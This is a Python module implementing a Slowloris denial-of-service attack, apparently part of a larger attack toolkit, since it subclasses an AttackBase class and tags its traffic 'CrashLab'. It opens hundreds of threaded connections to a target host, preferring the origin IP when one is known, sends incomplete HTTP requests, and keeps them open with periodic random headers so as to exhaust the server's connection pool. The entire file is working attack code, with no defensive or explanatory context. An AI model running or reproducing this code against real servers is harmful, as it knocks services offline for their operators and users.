import socket
import random
import threading
import time
import logging
from .base import AttackBase

logger = logging.getLogger(__name__)

class Slowloris(AttackBase):
    def __init__(self, target, config):
        super().__init__(target, config)
        self.socket_count = config.get('sockets', 200)
        self.sockets = []
        self.port = target.port
        self.host = target.origin_ip or target.hostname

    def run(self):
        logger.info("Slowloris: opening %d malicious connections", self.socket_count)
        # Open many sockets
        for _ in range(self.socket_count):
            t = threading.Thread(target=self._open_socket, daemon=True)
            t.start()
        # Keep-alive loop
        while not self._stop_event.is_set():
            for sock in list(self.sockets):
                try:
                    sock.send(f"X-a: {random.randint(0,9999)}\r\n".encode())
                except:
                    self.sockets.remove(sock)
            time.sleep(15)
        # Cleanup
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        logger.info("Slowloris stopped")

    def _open_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            # Send incomplete request
            sock.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.target.hostname}\r\n".encode())
            sock.send("User-Agent: CrashLab\r\n".encode())
            sock.send("Accept: text/html,application/xhtml+xml\r\n".encode())
            self.sockets.append(sock)
        except Exception as e:
            logger.debug("Slowloris socket failed: %s", e)
